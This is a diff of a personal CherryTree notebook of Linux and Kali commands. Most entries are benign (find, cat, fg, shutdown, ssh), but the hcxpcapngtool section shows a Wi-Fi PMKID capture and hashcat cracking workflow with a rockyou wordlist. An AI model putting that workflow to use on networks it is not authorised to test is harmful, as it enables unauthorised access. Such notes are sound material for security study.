@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="Info" unique_id="358" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="12" is_bold="0" foreground="" ts_creation="1725521274" ts_lastsave="1730250589">
+  <node name="Info" unique_id="358" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="12" is_bold="0" foreground="" ts_creation="1725521274" ts_lastsave="1730279794">
     <rich_text underline="single" scale="h1" weight="heavy">Linux Bible</rich_text>
     <rich_text>
 
@@ -37,7 +37,7 @@ Write and gathering by </rich_text>
       ▪ kali 2023 (Debain base)
       ▪ Kali 2024 6.6.9 
 
-	
+
 • </rich_text>
     <rich_text weight="heavy">V</rich_text>
     <rich_text>ersion 10.1.1 (First Release Version)
@@ -48,6 +48,13 @@ Write and gathering by </rich_text>
 • </rich_text>
     <rich_text weight="heavy">C</rich_text>
     <rich_text>urrent	</rich_text>
+    <rich_text weight="heavy">V</rich_text>
+    <rich_text>ersion </rich_text>
+    <rich_text weight="heavy">10.6.1</rich_text>
+    <rich_text> (1730279785)
+• </rich_text>
+    <rich_text weight="heavy">L</rich_text>
+    <rich_text>ast		</rich_text>
     <rich_text weight="heavy">V</rich_text>
     <rich_text>ersion </rich_text>
     <rich_text weight="heavy">10.6.0</rich_text>
@@ -67,12 +74,20 @@ Write and gathering by </rich_text>
 </rich_text>
     <node name="All" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1684283270" ts_lastsave="1728544797">
       <rich_text scale="h1">All commands sorted by alphabet</rich_text>
-      <node name="$" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283822" ts_lastsave="1724795731">
-        <rich_text>$PATH
-PATH=$PAHT:/bin:/sbin:/usr/bin:/usr/sbin
+      <node name="$" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283822" ts_lastsave="1730263859">
+        <rich_text scale="h1" weight="heavy">Linux Variables</rich_text>
+        <rich_text>
 
-$USER
-$0</rich_text>
+</rich_text>
+        <rich_text scale="h3" weight="heavy">• Set</rich_text>
+        <rich_text>
+x='hello world'
+
+</rich_text>
+        <rich_text scale="h3" weight="heavy">• Print</rich_text>
+        <rich_text>
+print $x
+echo $x</rich_text>
       </node>
       <node name="adduser" unique_id="330" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724699790" ts_lastsave="1724699844">
         <rich_text>$ </rich_text>
@@ -651,10 +666,12 @@ $ cal
 
 cal			- calender</rich_text>
       </node>
-      <node name="cat" unique_id="101" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285101" ts_lastsave="1729458317">
+      <node name="cat" unique_id="101" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285101" ts_lastsave="1730264754">
         <rich_text scale="h1" weight="heavy">cat
 </rich_text>
-        <rich_text>
+        <rich_text>cat &gt; tac
+
+
 cat (1)              - concatenate files and print on the standard output
 tac (1)              - concatenate and print files in reverse
 
@@ -695,7 +712,10 @@ tac (1)              - concatenate and print files in reverse
 </rich_text>
         <rich_text foreground="#5757e3e38989">$ cat file1.txt file2.txt | sort | uniq &gt; output.txt</rich_text>
         <rich_text>
-</rich_text>
+
+
+see:
+more, less, head, tail</rich_text>
       </node>
       <node name="cd" unique_id="113" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285149" ts_lastsave="1724730948">
         <rich_text scale="h1" weight="heavy">cd</rich_text>
@@ -1414,8 +1434,47 @@ EXAMPLE USAGE:
   More information and examples: https://github.com/ffuf/ffuf</rich_text>
         </node>
       </node>
-      <node name="fg" unique_id="387" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728552617" ts_lastsave="1728552617"/>
-      <node name="figlet" unique_id="235" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684441073" ts_lastsave="1684441098">
+      <node name="fg" unique_id="387" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728552617" ts_lastsave="1730264342">
+        <rich_text scale="h1" weight="heavy">fg</rich_text>
+        <rich_text>
+The fg command </rich_text>
+        <rich_text weight="heavy">moves a background job in the current environment into the foreground</rich_text>
+        <rich_text>.
+Use the JobID parameter to indicate a specific job to be run in the foreground.
+
+
+</rich_text>
+        <rich_text scale="h2">Syntax</rich_text>
+        <rich_text>
+fg [job_spec]
+
+• </rich_text>
+        <rich_text weight="heavy">%n:</rich_text>
+        <rich_text> Refers to job number n.
+• </rich_text>
+        <rich_text weight="heavy">%str:</rich_text>
+        <rich_text> Refers to a job that was started by a command beginning with str.
+• </rich_text>
+        <rich_text weight="heavy">%?str:</rich_text>
+        <rich_text> Refers to a job that was started by a command containing str.
+• </rich_text>
+        <rich_text weight="heavy">%% or %+: </rich_text>
+        <rich_text>Refers to the current job (this is the default job operated on by fg if no job_spec is provided).
+• </rich_text>
+        <rich_text weight="heavy">%-: </rich_text>
+        <rich_text>Refers to the previous job.
+
+Example:
+</rich_text>
+        <rich_text family="monospace">jobs
+bg %1
+fg %1</rich_text>
+        <rich_text>
+
+see:
+jobs, bg, fg</rich_text>
+      </node>
+      <node name="figlet" unique_id="235" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684441073" ts_lastsave="1730264381">
         <rich_text>$ figlet MKING       
  __  __ _  _____ _   _  ____ 
 |  \/  | |/ /_ _| \ | |/ ___|
@@ -1425,8 +1484,418 @@ EXAMPLE USAGE:
                              
 </rich_text>
       </node>
-      <node name="file" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285098" ts_lastsave="1684285101"/>
-      <node name="find" unique_id="117" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285168" ts_lastsave="1684285176"/>
+      <node name="file" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285098" ts_lastsave="1730264402">
+        <rich_text foreground="#18b2b2">hatis</rich_text>
+        <rich_text> file     
+file (1)             - determine file type
+</rich_text>
+      </node>
+      <node name="find" unique_id="117" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285168" ts_lastsave="1730260336">
+        <rich_text scale="h2" foreground="#5757e3e38989" weight="heavy">☐ Finding by Name</rich_text>
+        <rich_text scale="h3" weight="heavy">
+</rich_text>
+        <rich_text>
+find a file by name with the </rich_text>
+        <rich_text family="monospace">find</rich_text>
+        <rich_text> command:
+</rich_text>
+        <rich_text family="monospace">find -name "query"
+
+find -name "query_1" -or -name "query_2"
+</rich_text>
+        <rich_text>
+find a file by name but ignore the case of the query, useing </rich_text>
+        <rich_text family="monospace">-iname</rich_text>
+        <rich_text> option:
+</rich_text>
+        <rich_text family="monospace">find -iname "query"
+</rich_text>
+        <rich_text>
+find all files that dont adhere to a specific pattern, invert the search with </rich_text>
+        <rich_text family="monospace">-not</rich_text>
+        <rich_text>:
+</rich_text>
+        <rich_text family="monospace">find -not -name "query_to_avoid"
+</rich_text>
+        <rich_text>
+invert the search using an exclamation point (</rich_text>
+        <rich_text family="monospace">!</rich_text>
+        <rich_text>):
+</rich_text>
+        <rich_text family="monospace">find \! -name "query_to_avoid"
+</rich_text>
+        <rich_text>
+
+
+</rich_text>
+        <rich_text scale="h2" foreground="#5757e3e38989" weight="heavy">☐ Finding by Type</rich_text>
+        <rich_text scale="h3" weight="heavy">
+
+</rich_text>
+        <rich_text>syntax:
+</rich_text>
+        <rich_text family="monospace">find -type type_descriptor query</rich_text>
+        <rich_text>
+
+Here are some of the descriptors you can use to specify the type of file:
+• </rich_text>
+        <rich_text family="monospace">f</rich_text>
+        <rich_text>: regular file
+• </rich_text>
+        <rich_text family="monospace">d</rich_text>
+        <rich_text>: directory
+• </rich_text>
+        <rich_text family="monospace">l</rich_text>
+        <rich_text>: symbolic link
+• </rich_text>
+        <rich_text family="monospace">c</rich_text>
+        <rich_text>: character devices
+• </rich_text>
+        <rich_text family="monospace">b</rich_text>
+        <rich_text>: block devices
+
+find all of the character devices on your system:
+</rich_text>
+        <rich_text family="monospace">find /dev -type c
+</rich_text>
+        <rich_text>
+search for all files that end in </rich_text>
+        <rich_text family="monospace">.conf</rich_text>
+        <rich_text> with a command like the following: (matching files within the /usr directory)
+</rich_text>
+        <rich_text family="monospace">find /usr -type f -name "*.conf"
+
+
+</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text scale="h2" foreground="#5757e3e38989" weight="heavy">☐ Filtering by Time and Size</rich_text>
+        <rich_text>
+
+• </rich_text>
+        <rich_text family="monospace">c</rich_text>
+        <rich_text>: bytes
+• </rich_text>
+        <rich_text family="monospace">k</rich_text>
+        <rich_text>: kilobytes
+• </rich_text>
+        <rich_text family="monospace">M</rich_text>
+        <rich_text>: megabytes
+• </rich_text>
+        <rich_text family="monospace">G</rich_text>
+        <rich_text>: gigabytes
+• </rich_text>
+        <rich_text family="monospace">b</rich_text>
+        <rich_text>: 512-byte blocks
+
+find every file in the </rich_text>
+        <rich_text family="monospace">/usr</rich_text>
+        <rich_text> directory that is exactly 50 bytes:
+</rich_text>
+        <rich_text family="monospace">find /usr -size 50c
+</rich_text>
+        <rich_text>
+find files that are less than 50 bytes
+</rich_text>
+        <rich_text family="monospace">find /usr -size -50c
+
+</rich_text>
+        <rich_text>find files in the /usr directory that are more than 700 Megabytes</rich_text>
+        <rich_text family="monospace">
+find /usr -size +700M
+
+
+
+</rich_text>
+        <rich_text scale="h2" foreground="#5757e3e38989" weight="heavy">☐ Time</rich_text>
+        <rich_text family="monospace">
+
+</rich_text>
+        <rich_text>• </rich_text>
+        <rich_text weight="heavy">Access Time</rich_text>
+        <rich_text>: The last time a file was read or written to.
+• </rich_text>
+        <rich_text weight="heavy">Modification Time</rich_text>
+        <rich_text>: The last time the contents of the file were modified.
+• </rich_text>
+        <rich_text weight="heavy">Change Time</rich_text>
+        <rich_text>: The last time the file’s inode metadata was changed.
+
+find files in the </rich_text>
+        <rich_text family="monospace">/usr</rich_text>
+        <rich_text> directory that were modified within the last day:
+</rich_text>
+        <rich_text family="monospace">find /usr -mtime 1
+</rich_text>
+        <rich_text>
+files that were accessed less than a day ago:
+</rich_text>
+        <rich_text family="monospace">find /usr -atime -1
+
+</rich_text>
+        <rich_text>find files that last had their meta information changed more than 3 days ago:
+</rich_text>
+        <rich_text family="monospace">find /usr -ctime +3
+
+</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text scale="h2" foreground="#5757e3e38989" weight="heavy">☐ Finding by Owner and Permissions</rich_text>
+        <rich_text>
+
+• You can also search for files by the user or group that owns the file using the </rich_text>
+        <rich_text family="monospace">-user</rich_text>
+        <rich_text> and </rich_text>
+        <rich_text family="monospace">-group</rich_text>
+        <rich_text> parameters, respectively.
+
+find every file in the </rich_text>
+        <rich_text family="monospace">/var</rich_text>
+        <rich_text> directory that is owned by the </rich_text>
+        <rich_text weight="heavy">syslog</rich_text>
+        <rich_text> user:
+</rich_text>
+        <rich_text family="monospace">find /var -user syslog
+
+</rich_text>
+        <rich_text>find files in the </rich_text>
+        <rich_text family="monospace">/etc</rich_text>
+        <rich_text> directory owned by the </rich_text>
+        <rich_text weight="heavy">shadow</rich_text>
+        <rich_text> group:
+</rich_text>
+        <rich_text family="monospace">find /etc -group shadow
+
+
+</rich_text>
+        <rich_text>• You can also search for files with specific permissions.
+
+If you want to match an exact set of permissions, you use can this syntax specifying the permissions using octal notation:
+</rich_text>
+        <rich_text family="monospace">find / -perm 644
+
+</rich_text>
+        <rich_text>This will match files with exactly the permissions specified.
+If you want to specify anything with </rich_text>
+        <rich_text weight="heavy">at least</rich_text>
+        <rich_text> those permissions, you can precede the permissions notation with a minus sign:
+</rich_text>
+        <rich_text family="monospace">find / -perm -644
+</rich_text>
+        <rich_text>
+
+
+</rich_text>
+        <rich_text scale="h2" foreground="#5757e3e38989" weight="heavy">☐ Filtering by Depth</rich_text>
+        <rich_text scale="h3" weight="heavy">
+
+</rich_text>
+        <rich_text>Create the example directory structure within the </rich_text>
+        <rich_text family="monospace">/tmp/</rich_text>
+        <rich_text> directory with the following command:
+</rich_text>
+        <rich_text family="monospace">mkdir -p /tmp/test/level1dir{1..10}/level2dir{1..10}/level3dir{1..10}
+
+</rich_text>
+        <rich_text>Following that, populate these directories with some sample files using the touch command:
+</rich_text>
+        <rich_text family="monospace">touch /tmp/test/{file{1..10},level1dir{1..10}/{file{1..10},level2dir{1..10}/{file{1..10},level3dir{1..10}/file{1..10}}}}
+
+</rich_text>
+        <rich_text>With these files and directories in place, go ahead and navigate into the test/ directory you just created:</rich_text>
+        <rich_text family="monospace">
+cd /tmp/test</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text foreground="#35358484e4e4" weight="heavy">user@host</rich_text>
+        <rich_text>:</rich_text>
+        <rich_text foreground="#5454ff" weight="heavy">/tmp/test$ </rich_text>
+        <rich_text family="monospace">find -name file1</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text family="monospace">Output
+./level1dir7/level2dir8/level3dir9/file1
+./level1dir7/level2dir8/level3dir3/file1
+./level1dir7/level2dir8/level3dir4/file1
+./level1dir7/level2dir8/level3dir1/file1
+./level1dir7/level2dir8/level3dir8/file1
+./level1dir7/level2dir8/level3dir7/file1
+./level1dir7/level2dir8/level3dir2/file1
+./level1dir7/level2dir8/level3dir6/file1
+./level1dir7/level2dir8/level3dir5/file1
+./level1dir7/level2dir8/file1
+. . .</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text foreground="#35358484e4e4" weight="heavy">user@host</rich_text>
+        <rich_text>:</rich_text>
+        <rich_text foreground="#5454ff" weight="heavy">/tmp/test$ </rich_text>
+        <rich_text family="monospace">find -name file1</rich_text>
+        <rich_text> | wc -l
+
+</rich_text>
+        <rich_text family="monospace">Output
+1111</rich_text>
+        <rich_text>
+
+specify the maximum depth of the search under the top-level search directory:
+</rich_text>
+        <rich_text family="monospace">find -maxdepth num -name query
+
+</rich_text>
+        <rich_text foreground="#35358484e4e4" weight="heavy">user@host</rich_text>
+        <rich_text>:</rich_text>
+        <rich_text foreground="#5454ff" weight="heavy">/tmp/test$ </rich_text>
+        <rich_text family="monospace">find -maxdepth 2 -name file1</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text family="monospace">Output
+./level1dir7/file1
+./level1dir1/file1
+./level1dir3/file1
+./level1dir8/file1
+./level1dir6/file1
+./file1
+./level1dir2/file1
+./level1dir9/file1
+./level1dir4/file1
+./level1dir5/file1
+./level1dir10/file1</rich_text>
+        <rich_text>
+
+specify a minimum directory</rich_text>
+        <rich_text family="monospace">
+find -mindepth num -name query</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text foreground="#35358484e4e4" weight="heavy">user@host</rich_text>
+        <rich_text>:</rich_text>
+        <rich_text foreground="#5454ff" weight="heavy">/tmp/test$ </rich_text>
+        <rich_text family="monospace">find -mindepth 4 -name file1</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text family="monospace">Output
+./level1dir7/level2dir8/level3dir9/file1
+./level1dir7/level2dir8/level3dir3/file1
+./level1dir7/level2dir8/level3dir4/file1
+./level1dir7/level2dir8/level3dir1/file1
+./level1dir7/level2dir8/level3dir8/file1
+./level1dir7/level2dir8/level3dir7/file1
+./level1dir7/level2dir8/level3dir2/file1
+. . .
+</rich_text>
+        <rich_text>
+combine the min and max depth parameters to focus in on a narrow range:
+</rich_text>
+        <rich_text foreground="#35358484e4e4" weight="heavy">user@host</rich_text>
+        <rich_text>:</rich_text>
+        <rich_text foreground="#5454ff" weight="heavy">/tmp/test$ </rich_text>
+        <rich_text>find -mindepth 2 -maxdepth 3 -name file1
+
+</rich_text>
+        <rich_text family="monospace">Output
+./level1dir7/level2dir8/file1
+./level1dir7/level2dir5/file1
+./level1dir7/level2dir7/file1
+./level1dir7/level2dir2/file1
+./level1dir7/level2dir10/file1
+./level1dir7/level2dir6/file1
+./level1dir7/level2dir3/file1
+./level1dir7/level2dir4/file1
+./level1dir7/file1
+. . .
+
+
+
+</rich_text>
+        <rich_text scale="h2" foreground="#5757e3e38989" weight="heavy">☐ Executing Commands on find Results</rich_text>
+        <rich_text family="monospace">
+</rich_text>
+        <rich_text>
+• You can execute an arbitrary helper command on everything that find matches by using the -exec parameter using the following syntax:</rich_text>
+        <rich_text family="monospace">
+find find_parameters -exec command_and_options {} \;
+</rich_text>
+        <rich_text foreground="#9a9a99999696">The {} is used as a placeholder for the files that find matches. The \; lets find know where the command ends.</rich_text>
+        <rich_text family="monospace">
+
+
+</rich_text>
+        <rich_text>• For instance, assuming youre still in the test/ directory you created within the /tmp/ directory in the previous step, you could find the files in the previous section that had 644 permissions and modify them to have 664 permissions:</rich_text>
+        <rich_text family="monospace">
+find . -type f -perm 644 -exec chmod 664 {} \;
+</rich_text>
+        <rich_text>
+You could also change the directory permissions in a similar way:</rich_text>
+        <rich_text family="monospace">
+find . -type d -perm 755 -exec chmod 700 {} \;</rich_text>
+        <rich_text foreground="#c0c0bfbfbcbc">
+</rich_text>
+        <rich_text foreground="#9a9a99999696">This example finds every directory with permissions set to 755 and then modifies the permissions to 700.</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text family="monospace">
+</rich_text>
+        <rich_text>
+--------------------------------------------------------------------
+source: </rich_text>
+        <rich_text link="webs https://www.digitalocean.com/community/tutorials/how-to-use-find-and-locate-to-search-for-files-on-linux">https://www.digitalocean.com/community/tutorials/how-to-use-find-and-locate-to-search-for-files-on-linux</rich_text>
+        <node name="--help" unique_id="408" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1730259991" ts_lastsave="1730259992">
+          <rich_text>Usage: find [-H] [-L] [-P] [-Olevel] [-D debugopts] [path...] [expression]
+
+Default path is the current directory; default expression is -print.
+Expression may consist of: operators, options, tests, and actions.
+
+Operators (decreasing precedence; -and is implicit where no others are given):
+      ( EXPR )   ! EXPR   -not EXPR   EXPR1 -a EXPR2   EXPR1 -and EXPR2
+      EXPR1 -o EXPR2   EXPR1 -or EXPR2   EXPR1 , EXPR2
+
+Positional options (always true):
+      -daystart -follow -nowarn -regextype -warn
+
+Normal options (always true, specified before other expressions):
+      -depth -files0-from FILE -maxdepth LEVELS -mindepth LEVELS
+       -mount -noleaf -xdev -ignore_readdir_race -noignore_readdir_race
+
+Tests (N can be +N or -N or N):
+      -amin N -anewer FILE -atime N -cmin N -cnewer FILE -context CONTEXT
+      -ctime N -empty -false -fstype TYPE -gid N -group NAME -ilname PATTERN
+      -iname PATTERN -inum N -iwholename PATTERN -iregex PATTERN
+      -links N -lname PATTERN -mmin N -mtime N -name PATTERN -newer FILE
+      -nouser -nogroup -path PATTERN -perm [-/]MODE -regex PATTERN
+      -readable -writable -executable
+      -wholename PATTERN -size N[bcwkMG] -true -type [bcdpflsD] -uid N
+      -used N -user NAME -xtype [bcdpfls]
+
+Actions:
+      -delete -print0 -printf FORMAT -fprintf FILE FORMAT -print  
+      -fprint0 FILE -fprint FILE -ls -fls FILE -prune -quit
+      -exec COMMAND ; -exec COMMAND {} + -ok COMMAND ;
+      -execdir COMMAND ; -execdir COMMAND {} + -okdir COMMAND ;
+
+Other common options:
+      --help                   display this help and exit
+      --version                output version information and exit
+
+Valid arguments for -D:
+exec, opt, rates, search, stat, time, tree, all, help
+Use '-D help' for a description of the options, or see find(1)
+
+Please see also the documentation at https://www.gnu.org/software/findutils/.
+You can report (and track progress on fixing) bugs in the "find"
+program via the GNU findutils bug-reporting page at
+https://savannah.gnu.org/bugs/?group=findutils or, if
+you have no web access, by sending email to &lt;bug-findutils@gnu.org&gt;.
+</rich_text>
+        </node>
+      </node>
       <node name="finger" unique_id="87" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285000" ts_lastsave="1684285003"/>
       <node name="fping" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284076" ts_lastsave="1684284093"/>
       <node name="free" unique_id="164" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285479" ts_lastsave="1724285989">
@@ -3136,7 +3605,7 @@ $1$UxZQk.VH$Jkh7L16HcCtTfaaoCbRp90
           <rich_text foreground="#2e2ec2c27e7e">hashcat.potfile</rich_text>
         </node>
       </node>
-      <node name="hcxpcapngtool" unique_id="256" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1686724028" ts_lastsave="1687447074">
+      <node name="hcxpcapngtool" unique_id="256" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1686724028" ts_lastsave="1730264449">
         <rich_text scale="h1" weight="heavy">$ hcxpcapngtool</rich_text>
         <rich_text>
 convert pcapng, pcap and cap files to hash formats that hashcat and JtR use
@@ -3150,7 +3619,10 @@ hcxpcapngtool &lt;options&gt; *.cap
 hcxpcapngtool &lt;options&gt; *.*
 
 ex:
-$ hcxpcapngtool -o &lt;output&gt; &lt;wireshark_file.cap&gt;</rich_text>
+$ hcxpcapngtool -o &lt;output&gt; &lt;wireshark_file.cap&gt;
+
+see more:
+whoismac</rich_text>
         <node name="example" unique_id="278" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687447074" ts_lastsave="1687447239">
           <rich_text>• </rich_text>
           <rich_text weight="heavy">Capturing PMKID using hcxdumptool</rich_text>
@@ -3179,11 +3651,14 @@ hcxpcaptool -z pmkidhash raj
 hashcat -m 16800 --force pmkidhash /usr/share/wordlists/rockyou.txt --show</rich_text>
         </node>
       </node>
-      <node name="head" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285115" ts_lastsave="1685695904">
+      <node name="head" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285115" ts_lastsave="1730264590">
         <rich_text>head &gt; tail
 
-head -c 5  # 5 first chars
-head -n 5  # 5 first lines</rich_text>
+$ head -c 5  # 5 first chars
+$ head -n 5  # 5 first lines
+
+see:
+more, less, cat, tac</rich_text>
       </node>
       <node name="history" unique_id="53" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284294" ts_lastsave="1725152101">
         <rich_text scale="h1" weight="heavy">$ </rich_text>
@@ -4083,8 +4558,14 @@ $ last
 last (1)             - show a listing of last logged in users
 </rich_text>
       </node>
-      <node name="less" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285107" ts_lastsave="1728900393">
-        <rich_text>less &gt; more</rich_text>
+      <node name="less" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285107" ts_lastsave="1730264576">
+        <rich_text>less &gt; more
+
+$ less file.txt
+$ more file.txt
+
+see:
+head, tail, cat, tac</rich_text>
       </node>
       <node name="ld" unique_id="395" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728900393" ts_lastsave="1728900433">
         <rich_text scale="h1" weight="heavy">ld</rich_text>
@@ -4365,8 +4846,14 @@ or
 </rich_text>
         <rich_text weight="heavy">$ mkpasswd -m md5 &lt;password&gt;</rich_text>
       </node>
-      <node name="more" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285110" ts_lastsave="1685695950">
-        <rich_text>more &gt; less</rich_text>
+      <node name="more" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285110" ts_lastsave="1730264684">
+        <rich_text>more &gt; less
+
+$ more file.txt
+$ less file.txt
+
+see:
+head, tail, cat, tac</rich_text>
       </node>
       <node name="msfconsole" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283428" ts_lastsave="1727735848">
         <rich_text scale="h1" weight="heavy">msfconsole (1)       - Metasploit Framework Console</rich_text>
@@ -6113,14 +6600,53 @@ Jan 2006</rich_text>
 
 the file is un-recoverable no more</rich_text>
       </node>
-      <node name="shutdown" unique_id="150" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285381" ts_lastsave="1695267435">
-        <rich_text>shutdown (2)         - shut down part of a full-duplex connection
+      <node name="shutdown" unique_id="150" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285381" ts_lastsave="1730265161">
+        <rich_text scale="h1" weight="heavy">shutdown</rich_text>
+        <rich_text>
+
+shutdown (2)         - shut down part of a full-duplex connection
 shutdown (8)         - Halt, power off or reboot the machine
+
+</rich_text>
+        <rich_text weight="heavy">
+</rich_text>
+        <rich_text scale="h3" weight="heavy">Set scheduled shutdown:</rich_text>
+        <rich_text>
+$ shutdown -h &lt;TIME&gt;
+$ shutdown -h now
+
+</rich_text>
+        <rich_text scale="h3" weight="heavy">Cancel scheduled shutdown:</rich_text>
+        <rich_text>
+$ shutdown -c</rich_text>
+      </node>
+      <node name="sleep" unique_id="228" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684287324" ts_lastsave="1730264982">
+        <rich_text scale="h1" weight="heavy">sleep   </rich_text>
+        <rich_text>
+   
+sleep (1)            - delay for a specified amount of time
+sleep (3)            - sleep for a specified number of seconds
 </rich_text>
       </node>
-      <node name="smbclient" unique_id="228" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684287324" ts_lastsave="1684287328"/>
-      <node name="sqlmap" unique_id="239" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684529797" ts_lastsave="1684529797"/>
-      <node name="ssh" unique_id="49" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284251" ts_lastsave="1728250626"/>
+      <node name="smbclient" unique_id="409" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1730264834" ts_lastsave="1730264975">
+        <rich_text scale="h1" weight="heavy">smbclient</rich_text>
+        <rich_text>
+smbclient (1)        - ftp-like client to access SMB/CIFS resources on servers</rich_text>
+      </node>
+      <node name="sqlmap" unique_id="239" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684529797" ts_lastsave="1730264958">
+        <rich_text scale="h1" weight="heavy">sqlmap    </rich_text>
+        <rich_text>
+sqlmap (1)           - automatic SQL injection tool
+</rich_text>
+      </node>
+      <node name="ssh" unique_id="49" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284251" ts_lastsave="1730264946">
+        <rich_text scale="h1" weight="heavy">ssh   </rich_text>
+        <rich_text scale="h1">     </rich_text>
+        <rich_text>
+ssh (1)              - OpenSSH remote login client
+
+$ ssh user@IP</rich_text>
+      </node>
       <node name="ssh-keygen" unique_id="375" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728250626" ts_lastsave="1728250709">
         <rich_text scale="h1" weight="heavy">ssh-keygen</rich_text>
         <rich_text>
@@ -6138,18 +6664,72 @@ stat (2)             - get file status
